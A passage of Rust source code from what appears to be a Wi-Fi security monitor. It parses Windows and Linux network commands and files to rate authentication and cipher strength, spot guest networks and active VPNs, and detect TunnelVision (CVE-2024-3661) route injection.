            auth_suite: raw.wifi.auth_suite,
            cipher_suite: raw.wifi.cipher_suite,
            radio_info: raw.wifi.radio_info,
            signal_percent: raw.wifi.signal_percent,
            rssi_dbm: raw.wifi.rssi_dbm,
            profile_category: raw.profile_category,
            local_ip: raw.local_ip,
            subnet_prefix: raw.subnet_prefix,
            gateway_ip,
            gateway_mac,
            dhcp_server: raw.dhcp_server,
            dns_servers: raw.dns_servers,
            vpn_active: raw.route.vpn_active,
            vpn_interfaces: raw.route.vpn_interfaces,
            tunnelvision_bypass: raw.route.tunnelvision_bypass,
            is_public_or_guest_ssid: is_untrusted_wifi,
            wifi_safety_score: wifi_score,
            wifi_grade,
            risk_level,
            exposed_lan_listeners,
            exposed_shadow_ai_ports,
            cleartext_sockets,
            checks,
        }
    }

    #[cfg(windows)]
    fn collect_platform_telemetry(&mut self, is_elevated: bool) -> Option<RawLinkSnapshot> {
        let sys_root = super::system_root();
        let sys32 = sys_root.join("System32");

        let netsh_out = run_bounded_cmd(&sys32.join("netsh.exe"), &["wlan", "show", "interfaces"])?;
        let wifi = parse_windows_netsh_wlan(&netsh_out);
        if !wifi.connected {
            return Some(RawLinkSnapshot {
                wifi,
                ..Default::default()
            });
        }

        let (local_v4, subnet_prefix, dhcp_server, dns_servers) = wifi
            .guid
            .as_deref()
            .map(read_windows_tcpip_interface_reg)
            .unwrap_or_default();

        let route_out = run_bounded_cmd(&sys32.join("ROUTE.EXE"), &["print", "-4"])
            .unwrap_or_default();
        let route = parse_windows_ipv4_routes(&route_out, local_v4);

        let arp_out = run_bounded_cmd(&sys32.join("arp.exe"), &["-a"]).unwrap_or_default();
        let arp_neighbors = parse_windows_arp_table(&arp_out, local_v4);

        let cache_key = format!(
            "{}|{}",
            wifi.guid.as_deref().unwrap_or(""),
            wifi.ssid
        );
        let profile_category = match &self.profile_cache {
            Some((k, ts, cat)) if k == &cache_key && ts.elapsed() < PROFILE_CACHE_TTL => *cat,
            _ => {
                let cat = detect_windows_profile_category(&sys32, &wifi.ssid, is_elevated);
                self.profile_cache = Some((cache_key, Instant::now(), cat));
                cat
            }
        };

        Some(RawLinkSnapshot {
            wifi,
            profile_category,
            local_ip: local_v4.map(IpAddr::V4),
            subnet_prefix,
            dhcp_server: dhcp_server.map(IpAddr::V4),
            dns_servers,
            route,
            arp_neighbors,
        })
    }

    #[cfg(target_os = "linux")]
    fn collect_platform_telemetry(&mut self, _is_elevated: bool) -> Option<RawLinkSnapshot> {
        let wireless_raw = read_proc_file("/proc/self/net/wireless").unwrap_or_default();
        let wireless_iface = wireless_raw
            .lines()
            .skip(2)
            .filter_map(|l| l.split(':').next())
            .map(str::trim)
            .find(|s| is_safe_linux_ifname(s))
            .map(ToString::to_string);

        let Some(ifname) = wireless_iface else {
            return Some(RawLinkSnapshot {
                wifi: ParsedWifiInterface {
                    connected: false,
                    interface_name: "wlan0".to_string(),
                    ..Default::default()
                },
                ..Default::default()
            });
        };

        let mut wifi = ParsedWifiInterface {
            connected: true,
            interface_name: ifname.clone(),
            ssid: ifname.clone(),
            auth_suite: "WPA2/WPA3".to_string(),
            cipher_suite: "CCMP".to_string(),
            auth_strength: Some(WifiAuthStrength::SharedPskWpa2),
            ..Default::default()
        };

        if let Some(nm_out) = run_bounded_cmd(
            Path::new("/usr/bin/nmcli"),
            &[
                "--wait",
                "1",
                "-t",
                "-f",
                "active,device,ssid,bssid,security,chan,signal",
                "dev",
                "wifi",
            ],
        ) {
            if let Some(parsed) = parse_linux_nmcli_wifi(&nm_out, &ifname) {
                wifi = parsed;
            }
        }

        let route_raw = read_proc_file("/proc/self/net/route").unwrap_or_default();
        let route = parse_linux_proc_route(&route_raw, &ifname);

        let arp_raw = read_proc_file("/proc/self/net/arp").unwrap_or_default();
        let arp_neighbors = parse_linux_proc_arp(&arp_raw, &ifname);

        let resolv_raw = read_regular_follow_bounded("/etc/resolv.conf").unwrap_or_default();
        let dns_servers = parse_resolv_conf(&resolv_raw);

        Some(RawLinkSnapshot {
            wifi,
            profile_category: WifiProfileCategory::Unknown,
            local_ip: None,
            subnet_prefix: None,
            dhcp_server: None,
            dns_servers,
            route,
            arp_neighbors,
        })
    }

    #[cfg(not(any(windows, target_os = "linux")))]
    fn collect_platform_telemetry(&mut self, _is_elevated: bool) -> Option<RawLinkSnapshot> {
        None
    }
}

/// Bounded, timeout-guarded, environment-sanitized subprocess reader.
fn run_bounded_cmd(program: &Path, args: &[&str]) -> Option<String> {
    if !program.is_absolute() {
        return None;
    }
    let mut cmd = Command::new(program);
    cmd.args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .env_clear();

    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        let sys_root = super::system_root();
        let sys_drive = sys_root
            .components()
            .next()
            .map(|c| c.as_os_str().to_os_string())
            .unwrap_or_else(|| std::ffi::OsString::from("C:"));
        cmd.env("SystemRoot", &sys_root)
            .env("windir", &sys_root)
            .env("SystemDrive", sys_drive)
            .current_dir(&sys_root)
            .creation_flags(CREATE_NO_WINDOW);
    }

    #[cfg(not(windows))]
    {
        cmd.env("PATH", "/usr/sbin:/usr/bin:/sbin:/bin")
            .env("LC_ALL", "C")
            .current_dir("/");
    }

    let mut child = cmd.spawn().ok()?;
    let stdout = child.stdout.take()?;

    std::thread::scope(|s| {
        let reader = s.spawn(move || {
            let mut buf = Vec::with_capacity(8192);
            let _ = stdout.take(MAX_CMD_OUTPUT_BYTES).read_to_end(&mut buf);
            buf
        });

        let start = Instant::now();
        let completed = loop {
            match child.try_wait() {
                Ok(Some(status)) => break status.success(),
                Ok(None) => {
                    if start.elapsed() >= CMD_TIMEOUT {
                        let _ = child.kill();
                        let _ = child.wait();
                        break false;
                    }
                    std::thread::sleep(Duration::from_millis(15));
                }
                Err(_) => {
                    let _ = child.kill();
                    let _ = child.wait();
                    break false;
                }
            }
        };

        let bytes = reader.join().ok()?;
        if !completed && bytes.is_empty() {
            return None;
        }
        Some(String::from_utf8_lossy(&bytes).into_owned())
    })
}

#[cfg(windows)]
fn read_windows_tcpip_interface_reg(
    guid: &str,
) -> (Option<Ipv4Addr>, Option<u8>, Option<Ipv4Addr>, Vec<IpAddr>) {
    use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
    let clean_guid = guid.trim().trim_matches(|c| c == '{' || c == '}');
    let subkey = format!(
        r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{{{}}}",
        clean_guid
    );
    let Ok(key) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(subkey) else {
        return (None, None, None, Vec::new());
    };

    let read_v4 = |names: &[&str]| -> Option<Ipv4Addr> {
        for n in names {
            if let Ok(val) = key.get_value::<String, _>(n) {
                for tok in val.split(|c: char| c.is_whitespace() || c == ',' || c == '\0') {
                    if let Ok(ip) = tok.trim().parse::<Ipv4Addr>() {
                        if !ip.is_unspecified() {
                            return Some(ip);
                        }
                    }
                }
            }
            if let Ok(vals) = key.get_value::<Vec<String>, _>(n) {
                for v in vals {
                    if let Ok(ip) = v.trim().parse::<Ipv4Addr>() {
                        if !ip.is_unspecified() {
                            return Some(ip);
                        }
                    }
                }
            }
        }
        None
    };

    let local_ip = read_v4(&["DhcpIPAddress", "IPAddress"]);
    let mask = read_v4(&["DhcpSubnetMask", "SubnetMask"]);
    let prefix = mask.map(|m| {
        u32::from(m).leading_ones() as u8
    });
    let dhcp_server = read_v4(&["DhcpServer"]);

    // Static NameServer overrides DhcpNameServer when non-empty.
    let mut dns_servers = Vec::new();
    for field in ["NameServer", "DhcpNameServer"] {
        if let Ok(raw) = key.get_value::<String, _>(field) {
            for tok in raw.split(|c: char| c.is_whitespace() || c == ',' || c == ';') {
                if let Ok(ip) = tok.trim().parse::<IpAddr>() {
                    if !ip.is_unspecified() && !dns_servers.contains(&ip) {
                        dns_servers.push(ip);
                    }
                }
            }
            if !dns_servers.is_empty() {
                break;
            }
        }
    }

    (local_ip, prefix, dhcp_server, dns_servers)
}

#[cfg(windows)]
fn detect_windows_profile_category(
    sys32: &Path,
    ssid: &str,
    is_elevated: bool,
) -> WifiProfileCategory {
    if is_elevated {
        use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
        if let Ok(profiles) = RegKey::predef(HKEY_LOCAL_MACHINE)
            .open_subkey(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles")
        {
            for sub in profiles.enum_keys().flatten() {
                if let Ok(pk) = profiles.open_subkey(&sub) {
                    let pname: String = pk.get_value("ProfileName").unwrap_or_default();
                    if pname == ssid || pname.starts_with(ssid) {
                        if let Ok(cat) = pk.get_value::<u32, _>("Category") {
                            return match cat {
                                0 => WifiProfileCategory::Public,
                                1 => WifiProfileCategory::Private,
                                2 => WifiProfileCategory::Domain,
                                _ => WifiProfileCategory::Unknown,
                            };
                        }
                    }
                }
            }
        }
    }

    // Fast native unprivileged check via `netsh advfirewall monitor show currentprofile`.
    if let Some(out) = run_bounded_cmd(
        &sys32.join("netsh.exe"),
        &["advfirewall", "monitor", "show", "currentprofile"],
    ) {
        let mut current_cat = WifiProfileCategory::Unknown;
        for line in out.lines() {
            let trimmed = line.trim();
            let lower = trimmed.to_lowercase();
            if trimmed.ends_with(':') {
                if lower.contains("public")
                    || lower.contains("pubblic")
                    || lower.contains("öffentlich")
                    || lower.contains("públic")
                {
                    current_cat = WifiProfileCategory::Public;
                } else if lower.contains("private")
                    || lower.contains("privat")
                    || lower.contains("privé")
                {
                    current_cat = WifiProfileCategory::Private;
                } else if lower.contains("domain") || lower.contains("domini") || lower.contains("domän")
                {
                    current_cat = WifiProfileCategory::Domain;
                }
            } else if !ssid.is_empty() && trimmed == ssid && current_cat != WifiProfileCategory::Unknown {
                return current_cat;
            }
        }
        if current_cat != WifiProfileCategory::Unknown && out.lines().count() <= 8 {
            return current_cat;
        }
    }

    WifiProfileCategory::Unknown
}

/// Locale-invariant parser for `netsh wlan show interfaces` across English, Italian, German, etc.
#[cfg(any(windows, test))]
#[must_use]
pub fn parse_windows_netsh_wlan(output: &str) -> ParsedWifiInterface {
    let mut res = ParsedWifiInterface {
        interface_name: "Wi-Fi".to_string(),
        ..Default::default()
    };

    let mut local_mac: Option<String> = None;
    let mut akm_code: Option<String> = None;
    let mut cipher_code: Option<String> = None;
    let mut raw_auth_text = String::new();
    let mut raw_cipher_text = String::new();
    let mut radio_type = String::new();

    for line in output.lines() {
        // Parse IEEE 802.11 OUI suite line `[ akm = 00-0f-ac:08, ... = 00-0f-ac:04 ]` (100% locale-free!).
        if line.contains("00-0f-ac:") || line.contains("00-0F-AC:") || line.contains("akm =") {
            let suites = extract_oui_suites(line);
            if let Some(first) = suites.first() {
                akm_code = Some(first.clone());
            }
            if let Some(second) = suites.get(1) {
                cipher_code = Some(second.clone());
            }
        }

        let Some((lhs, rhs)) = line.split_once(':') else {
            continue;
        };
        let key_trim = lhs.trim();
        let key_lower = key_trim.to_lowercase();
        let val_trim = rhs.trim();

        if key_trim.eq_ignore_ascii_case("GUID") {
            if let Some(uuid) = extract_uuid_token(val_trim) {
                res.guid = Some(uuid);
            }
            continue;
        }

        // Exact `SSID` (not `BSSID`) is preserved across Windows locales.
        if key_trim.eq_ignore_ascii_case("SSID") {
            if !val_trim.is_empty() {
                res.ssid = val_trim.to_string();
                res.connected = true;
            }
            continue;
        }

        if key_lower.contains("bssid") {
            // Note: rhs already starts after the first `:`, so scan full `rhs` (which contains 5 more colons!).
            if let Some(mac) = extract_colon_mac(val_trim) {
                res.bssid = mac;
                res.connected = true;
            }
            continue;
        }

        if local_mac.is_none() {
            if let Some(mac) = extract_colon_mac(val_trim) {
                local_mac = Some(mac);
            }
        }

        if key_trim.eq_ignore_ascii_case("Name") || key_trim.eq_ignore_ascii_case("Nome") {
            if !val_trim.is_empty() {
                res.interface_name = val_trim.to_string();
            }
        } else if key_trim.eq_ignore_ascii_case("Rssi") {
            if let Ok(v) = val_trim.parse::<i32>() {
                res.rssi_dbm = Some(v);
            }
        } else if let Some(pct_str) = val_trim.strip_suffix('%') {
            if let Ok(pct) = pct_str.trim().parse::<u8>() {
                res.signal_percent = Some(pct);
            }
        } else if val_trim.starts_with("802.11") {
            radio_type = val_trim
                .split_whitespace()
                .next()
                .unwrap_or(val_trim)
                .to_string();
        } else if key_lower.contains("auth") || key_lower.contains("autentic") {
            // Strip glued localized suffix like `WPA3-PersonalCrittografia`
            raw_auth_text = val_trim
                .trim_end_matches("Crittografia")
                .trim_end_matches("Cipher")
                .trim()
                .to_string();
        } else if key_lower.contains("cipher")
            || key_lower.contains("crittograf")
            || key_lower.contains("verschlüss")
            || key_lower.contains("chiffrement")
        {
            if !val_trim.starts_with('[') {
                raw_cipher_text = val_trim.to_string();
            }
        }
    }

    if !res.connected {
        return res;
    }

    // Prefer exact IEEE 802.11 AKM & Cipher Suite OUI selectors when present.
    if let Some(akm) = &akm_code {
        let (suite_label, strength) = decode_ieee_akm(akm);
        res.auth_suite = suite_label.to_string();
        res.auth_strength = Some(strength);
    } else if !raw_auth_text.is_empty() {
        res.auth_suite = raw_auth_text.clone();
    } else {
        res.auth_suite = "Unknown".to_string();
    }

    if let Some(cip) = &cipher_code {
        let (cip_label, is_broken) = decode_ieee_cipher(cip);
        res.cipher_suite = cip_label.to_string();
        if is_broken {
            res.auth_strength = Some(WifiAuthStrength::OpenOrBroken);
        }
    } else if !raw_cipher_text.is_empty() {
        res.cipher_suite = raw_cipher_text.clone();
    } else {
        res.cipher_suite = "Unknown".to_string();
    }

    if res.auth_strength.is_none() {
        res.auth_strength = Some(classify_auth_Cipher(&res.auth_suite, &res.cipher_suite));
    }
    res.radio_info = if radio_type.is_empty() {
        "802.11".to_string()
    } else {
        radio_type
    };
    let _ = local_mac;
    res
}

/// Locale-invariant parser for Windows `arp -a`, scoped to the Wi-Fi adapter's IPv4 block.
#[cfg(any(windows, test))]
#[must_use]
pub fn parse_windows_arp_table(
    output: &str,
    wifi_ip: Option<Ipv4Addr>,
) -> Vec<(Ipv4Addr, String)> {
    let mut out = Vec::new();
    let mut in_matching_iface = wifi_ip.is_none();

    for line in output.lines() {
        let trimmed = line.trim();
        if trimmed.contains("---") {
            if let Some(target_ip) = wifi_ip {
                in_matching_iface = trimmed
                    .split_whitespace()
                    .any(|tok| tok.parse::<Ipv4Addr>().ok() == Some(target_ip));
            }
            continue;
        }
        if !in_matching_iface {
            continue;
        }
        let mut parts = trimmed.split_whitespace();
        let Some(ip_tok) = parts.next() else { continue };
        let Some(mac_tok) = parts.next() else { continue };
        let Ok(ip) = ip_tok.parse::<Ipv4Addr>() else {
            continue;
        };
        if ip.is_multicast() || ip.is_broadcast() || ip.is_unspecified() {
            continue;
        }
        if let Some(mac) = normalize_mac(mac_tok) {
            if is_valid_unicast_mac(&mac) {
                out.push((ip, mac));
            }
        }
    }
    out
}

/// Locale-invariant parser for `ROUTE.EXE print -4` (detects default gateway, VPN adapters, and CVE-2024-3661 `/1` routes).
#[cfg(any(windows, test))]
#[must_use]
pub fn parse_windows_ipv4_routes(
    output: &str,
    wifi_ip: Option<Ipv4Addr>,
) -> ParsedRouteTelemetry {
    let mut res = ParsedRouteTelemetry::default();
    let mut vpn_names = Vec::new();

    let mut best_default_metric = u32::MAX;
    let mut split_low_on_wifi = false;
    let mut split_high_on_wifi = false;
    let mut has_vpn_route_or_adapter = false;

    for line in output.lines() {
        let trimmed = line.trim();
        // Adapter list lines look like: `24...00 09 0f fe 00 01 ......Fortinet Virtual Ethernet Adapter`
        if trimmed.contains("...") {
            let lower = trimmed.to_ascii_lowercase();
            let is_up_vpn = (lower.contains("wireguard")
                || lower.contains("tailscale")
                || lower.contains("wintun")
                || lower.contains("openvpn")
                || lower.contains("protonvpn")
                || lower.contains("nordlynx")
                || lower.contains("mullvad")
                || lower.contains("cisco anyconnect")
                || lower.contains("pangp"))
                && !lower.contains("disconnected");
            if is_up_vpn {
                if let Some(name) = trimmed.rsplit("...").next() {
                    let clean = name.trim_start_matches('.').trim().to_string();
                    if !clean.is_empty() && !vpn_names.contains(&clean) {
                        vpn_names.push(clean);
                    }
                }
            }
            continue;
        }

        let cols: Vec<&str> = trimmed.split_whitespace().collect();
        if cols.len() != 5 {
            continue;
        }
        let (Ok(dest), Ok(mask), Ok(iface_ip), Ok(metric)) = (
            cols[0].parse::<Ipv4Addr>(),
            cols[1].parse::<Ipv4Addr>(),
            cols[3].parse::<Ipv4Addr>(),
            cols[4].parse::<u32>(),
        ) else {
            continue;
        };
        let gw_opt = cols[2].parse::<Ipv4Addr>().ok();

        let on_wifi = wifi_ip.is_none_or(|wip| iface_ip == wip);
        let on_other_non_loopback =
            !iface_ip.is_loopback() && wifi_ip.is_some_and(|wip| iface_ip != wip);

        if dest == Ipv4Addr::UNSPECIFIED && mask == Ipv4Addr::UNSPECIFIED {
            if on_wifi {
                if let Some(gw) = gw_opt {
                    if metric <= best_default_metric {
                        best_default_metric = metric;
                        res.default_gateway = Some(gw);
                    }
                }
            } else if on_other_non_loopback {
                has_vpn_route_or_adapter = true;
            }
        }

        // TunnelVision (CVE-2024-3661): DHCP Option 121 injects 0.0.0.0/1 (128.0.0.0) + 128.0.0.0/1 (128.0.0.0)
        // onto the physical Wi-Fi gateway to out-prioritize a 0.0.0.0/0 VPN default route!
        let slash_one = Ipv4Addr::new(128, 0, 0, 0);
        if mask == slash_one && on_wifi && gw_opt.is_some() {
            if dest == Ipv4Addr::UNSPECIFIED {
                split_low_on_wifi = true;
            } else if dest == slash_one {
                split_high_on_wifi = true;
            }
        } else if mask == slash_one && on_other_non_loopback {
            has_vpn_route_or_adapter = true;
            if vpn_names.is_empty() {
                vpn_names.push(format!("Tunnel ({})", iface_ip));
            }
        }
    }

    res.vpn_active = !vpn_names.is_empty() || has_vpn_route_or_adapter;
    if res.vpn_active && vpn_names.is_empty() {
        vpn_names.push("Active Tunnel".to_string());
    }
    res.vpn_interfaces = vpn_names;
    res.tunnelvision_bypass = res.vpn_active && split_low_on_wifi && split_high_on_wifi;
    res
}

#[cfg(target_os = "linux")]
fn is_safe_linux_ifname(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 15
        && !s.starts_with('-')
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b':' | b'-'))
}

#[cfg(target_os = "linux")]
fn read_proc_file(path: &str) -> Option<String> {
    let f = std::fs::File::open(path).ok()?;
    let mut out = String::new();
    f.take(MAX_CMD_OUTPUT_BYTES).read_to_string(&mut out).ok()?;
    Some(out)
}

#[cfg(target_os = "linux")]
fn read_regular_follow_bounded(path: &str) -> Option<String> {
    let f = std::fs::File::open(path).ok()?;
    if !f.metadata().ok()?.is_file() {
        return None;
    }
    let mut out = String::new();
    f.take(64 * 1024).read_to_string(&mut out).ok()?;
    Some(out)
}

#[cfg(any(target_os = "linux", test))]
#[must_use]
pub fn parse_linux_proc_arp(output: &str, wifi_iface: &str) -> Vec<(Ipv4Addr, String)> {
    let mut out = Vec::new();
    for line in output.lines().skip(1) {
        let cols: Vec<&str> = line.split_whitespace().collect();
        if cols.len() < 6 || cols[5] != wifi_iface {
            continue;
        }
        let Ok(ip) = cols[0].parse::<Ipv4Addr>() else {
            continue;
        };
        if let Some(mac) = normalize_mac(cols[3]) {
            if is_valid_unicast_mac(&mac) {
                out.push((ip, mac));
            }
        }
    }
    out
}

#[cfg(any(target_os = "linux", test))]
#[must_use]
pub fn parse_linux_proc_route(output: &str, wifi_iface: &str) -> ParsedRouteTelemetry {
    let mut res = ParsedRouteTelemetry::default();
    let mut vpn_set = BTreeSet::new();
    let mut split_low_on_wifi = false;
    let mut split_high_on_wifi = false;

    for line in output.lines().skip(1) {
        let cols: Vec<&str> = line.split_whitespace().collect();
        if cols.len() < 8 {
            continue;
        }
        let iface = cols[0];
        if iface.starts_with("wg")
            || iface.starts_with("tun")
            || iface.starts_with("tap")
            || iface.starts_with("tailscale")
            || iface.starts_with("proton")
            || iface.starts_with("nordlynx")
        {
            vpn_set.insert(iface.to_string());
        }
        let (Ok(dest_le), Ok(gw_le), Ok(mask_le)) = (
            u32::from_str_radix(cols[1], 16),
            u32::from_str_radix(cols[2], 16),
            u32::from_str_radix(cols[7], 16),
        ) else {
            continue;
        };
        let dest = Ipv4Addr::from(u32::from_be(dest_le));
        let gw = Ipv4Addr::from(u32::from_be(gw_le));
        let mask = Ipv4Addr::from(u32::from_be(mask_le));

        if iface == wifi_iface {
            if dest == Ipv4Addr::UNSPECIFIED && mask == Ipv4Addr::UNSPECIFIED && !gw.is_unspecified()
            {
                res.default_gateway = Some(gw);
            }
            let slash_one = Ipv4Addr::new(128, 0, 0, 0);
            if mask == slash_one && !gw.is_unspecified() {
                if dest == Ipv4Addr::UNSPECIFIED {
                    split_low_on_wifi = true;
                } else if dest == slash_one {
                    split_high_on_wifi = true;
                }
            }
        }
    }

    res.vpn_interfaces = vpn_set.into_iter().collect();
    res.vpn_active = !res.vpn_interfaces.is_empty();
    res.tunnelvision_bypass = res.vpn_active && split_low_on_wifi && split_high_on_wifi;
    res
}

#[cfg(any(target_os = "linux", test))]
#[must_use]
pub fn parse_linux_nmcli_wifi(output: &str, wifi_iface: &str) -> Option<ParsedWifiInterface> {
    // Format (`-t -f active,device,ssid,bssid,security,chan,signal`), where `:` inside values is escaped as `\:`
    for line in output.lines() {
        let fields = split_nmcli_terse(line);
        if fields.len() < 7 {
            continue;
        }
        if fields[0] != "yes" || fields[1] != wifi_iface {
            continue;
        }
        let ssid = fields[2].clone();
        let bssid = normalize_mac(&fields[3]).unwrap_or_default();
        let sec = if fields[4].is_empty() || fields[4] == "--" {
            "OPEN".to_string()
        } else {
            fields[4].clone()
        };
        let cipher = if sec == "OPEN" {
            "NONE".to_string()
        } else {
            "CCMP".to_string()
        };
        let strength = classify_auth_Cipher(&sec, &cipher);
        return Some(ParsedWifiInterface {
            connected: true,
            interface_name: wifi_iface.to_string(),
            guid: None,
            ssid,
            bssid,
            auth_suite: sec,
            cipher_suite: cipher,
            auth_strength: Some(strength),
            radio_info: format!("ch {}", fields[5]),
            signal_percent: fields[6].parse::<u8>().ok(),
            rssi_dbm: None,
        });
    }
    None
}

#[cfg(any(target_os = "linux", test))]
#[must_use]
pub fn parse_resolv_conf(raw: &str) -> Vec<IpAddr> {
    let mut out = Vec::new();
    for line in raw.lines() {
        let clean = line.split('#').next().unwrap_or("").trim();
        if let Some(rest) = clean.strip_prefix("nameserver") {
            if let Ok(ip) = rest.trim().parse::<IpAddr>() {
                if !out.contains(&ip) {
                    out.push(ip);
                }
            }
        }
    }
    out
}

#[cfg(any(target_os = "linux", test))]
fn split_nmcli_terse(line: &str) -> Vec<String> {
    let mut fields = Vec::new();
    let mut curr = String::new();
    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' {
            if let Some(&next) = chars.peek() {
                if next == ':' || next == '\\' {
                    curr.push(chars.next().unwrap());
                    continue;
                }
            }
            curr.push(c);
        } else if c == ':' {
            fields.push(std::mem::take(&mut curr));
        } else {
            curr.push(c);
        }
    }
    fields.push(curr);
    fields
}

#[cfg(any(windows, test))]
fn decode_ieee_akm(code: &str) -> (&'static str, WifiAuthStrength) {
    match code.to_ascii_lowercase().as_str() {
        "00-0f-ac:08" | "00-0f-ac:09" | "00-0f-ac:24" => {
            ("WPA3-Personal (SAE)", WifiAuthStrength::StrongSaeOrEnterprise)
        }
        "00-0f-ac:01" | "00-0f-ac:03" | "00-0f-ac:05" | "00-0f-ac:11" | "00-0f-ac:12" => {
            ("WPA2/WPA3-Enterprise (802.1X)", WifiAuthStrength::StrongSaeOrEnterprise)
        }
        "00-0f-ac:18" => ("Enhanced Open (OWE)", WifiAuthStrength::EnhancedOpenOwe),
        "00-0f-ac:02" | "00-0f-ac:04" | "00-0f-ac:06" => {
            ("WPA2-Personal (PSK)", WifiAuthStrength::SharedPskWpa2)
        }
        "00-00-00:00" | "00-0f-ac:00" => ("OPEN (Unencrypted)", WifiAuthStrength::OpenOrBroken),
        _ => ("802.11 Authenticated", WifiAuthStrength::SharedPskWpa2),
    }
}

#[cfg(any(windows, test))]
fn decode_ieee_cipher(code: &str) -> (&'static str, bool) {
    match code.to_ascii_lowercase().as_str() {
        "00-0f-ac:04" => ("CCMP-128 (AES)", false),
        "00-0f-ac:08" => ("GCMP-128", false),
        "00-0f-ac:09" | "00-0f-ac:0a" => ("GCMP-256 / CCMP-256", false),
        "00-0f-ac:02" => ("TKIP (Deprecated)", true),
        "00-0f-ac:01" | "00-0f-ac:05" => ("WEP (Broken)", true),
        "00-0f-ac:00" | "00-00-00:00" => ("NONE (Cleartext)", true),
        _ => ("802.11 Cipher", false),
    }
}

#[allow(non_snake_case)]
fn classify_auth_Cipher(auth: &str, cipher: &str) -> WifiAuthStrength {
    let a = auth.to_lowercase();
    let c = cipher.to_lowercase();
    if c.contains("none")
        || c.contains("nessun")
        || c.contains("wep")
        || c.contains("tkip")
        || a == "open"
        || a.contains("unencrypted")
        || a.contains("aperta")
        || a.contains("offen")
        || a.contains("ouvert")
        || a.contains("abierta")
        || a.contains("wep")
    {
        WifiAuthStrength::OpenOrBroken
    } else if a.contains("owe") || a.contains("enhanced open") {
        WifiAuthStrength::EnhancedOpenOwe
    } else if a.contains("wpa3") || a.contains("sae") || a.contains("802.1x") || a.contains("enterprise")
    {
        WifiAuthStrength::StrongSaeOrEnterprise
    } else {
        WifiAuthStrength::SharedPskWpa2
    }
}

fn looks_like_public_or_guest_ssid(ssid: &str) -> bool {
    let lower = ssid.to_ascii_lowercase();
    const TOKENS: &[&str] = &[
        "guest",
        "free",
        "public",
        "hotel",
        "airport",
        "cafe",
        "coffee",
        "starbucks",
        "lounge",
        "visitor",
        "lobby",
        "hotspot",
        "open",
        "train",
        "shinkansen",
        "metro",
    ];
    TOKENS.iter().any(|t| lower.contains(t))
}

fn is_public_unicast(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => {
            !v4.is_private()
                && !v4.is_loopback()
                && !v4.is_link_local()
                && !v4.is_broadcast()
                && !v4.is_multicast()
                && !v4.is_unspecified()
                && !(v4.octets()[0] == 100 && (v4.octets()[1] & 0xC0) == 64) // CGNAT 100.64.0.0/10
        }
        IpAddr::V6(v6) => {
            let seg0 = v6.segments()[0];
            !v6.is_loopback()
                && !v6.is_unspecified()
                && !v6.is_multicast()
                && (seg0 & 0xffc0) != 0xfe80
                && (seg0 & 0xfe00) != 0xfc00
        }
    }
}

#[cfg(any(windows, test))]
fn extract_oui_suites(line: &str) -> Vec<String> {
    let bytes = line.as_bytes();
    let mut out = Vec::new();
    if bytes.len() < 11 {
        return out;
    }
    let mut i = 0;
    while i + 11 <= bytes.len() {
        let win = &bytes[i..i + 11];
        if win[2] == b'-'
            && win[5] == b'-'
            && win[8] == b':'
            && win[0..2].iter().all(u8::is_ascii_hexdigit)
            && win[3..5].iter().all(u8::is_ascii_hexdigit)
            && win[6..8].iter().all(u8::is_ascii_hexdigit)
            && win[9..11].iter().all(u8::is_ascii_hexdigit)
        {
            out.push(String::from_utf8_lossy(win).to_ascii_lowercase());
            i += 11;
        } else {
            i += 1;
        }
    }
    out
}

#[cfg(any(windows, test))]
fn extract_colon_mac(s: &str) -> Option<String> {
    let bytes = s.as_bytes();
    if bytes.len() < 17 {
        return None;
    }
    for i in 0..=(bytes.len() - 17) {
        let w = &bytes[i..i + 17];
        if w[2] == b':'
            && w[5] == b':'
            && w[8] == b':'
            && w[11] == b':'
            && w[14] == b':'
            && w[0..2].iter().all(u8::is_ascii_hexdigit)
            && w[3..5].iter().all(u8::is_ascii_hexdigit)
            && w[6..8].iter().all(u8::is_ascii_hexdigit)
            && w[9..11].iter().all(u8::is_ascii_hexdigit)
            && w[12..14].iter().all(u8::is_ascii_hexdigit)
            && w[15..17].iter().all(u8::is_ascii_hexdigit)
        {
            return Some(String::from_utf8_lossy(w).to_ascii_lowercase());
        }
    }
    None
}

#[cfg(any(windows, test))]
fn extract_uuid_token(s: &str) -> Option<String> {
    let clean = s.trim().trim_matches(|c| c == '{' || c == '}');
    if clean.len() == 36
        && clean
            .bytes()
            .enumerate()
            .all(|(idx, b)| match idx {
                8 | 13 | 18 | 23 => b == b'-',
                _ => b.is_ascii_hexdigit(),
            })
    {
        Some(clean.to_ascii_lowercase())
    } else {
        None
    }
}

fn normalize_mac(tok: &str) -> Option<String> {
    let clean = tok.trim();
    if clean.len() != 17 {
        return None;
    }
    let b = clean.as_bytes();
    let sep = b[2];
    if (sep != b':' && sep != b'-')
        || b[5] != sep
        || b[8] != sep
        || b[11] != sep
        || b[14] != sep
    {
        return None;
    }
    for chunk in [0..2, 3..5, 6..8, 9..11, 12..14, 15..17] {
        if !b[chunk].iter().all(u8::is_ascii_hexdigit) {
            return None;
        }
    }
    Some(clean.replace('-', ":").to_ascii_lowercase())
}

fn is_valid_unicast_mac(mac: &str) -> bool {
    if mac == "00:00:00:00:00:00" || mac == "ff:ff:ff:ff:ff:ff" {
        return false;
    }
    let Some(first_hex) = mac.get(0..2) else {
        return false;
    };
    let Ok(first_octet) = u8::from_str_radix(first_hex, 16) else {
        return false;
    };
    // IEEE 802 I/G bit (bit 0 of first octet): 0 = unicast, 1 = multicast/broadcast
    (first_octet & 0x01) == 0
}

fn oui_prefix(mac: &str) -> &str {
    mac.get(0..8).unwrap_or("")
}

/// Excludes IANA dynamic/ephemeral UDP client sockets (`>= 49152`) and essential DHCP/NTP/VPN UDP ports
/// so Wi-Fi Shield never miscounts outbound QUIC/DNS clients or interferes with DHCP/IKEv2/WireGuard.
fn is_lockdown_eligible_udp_port(port: u16) -> bool {
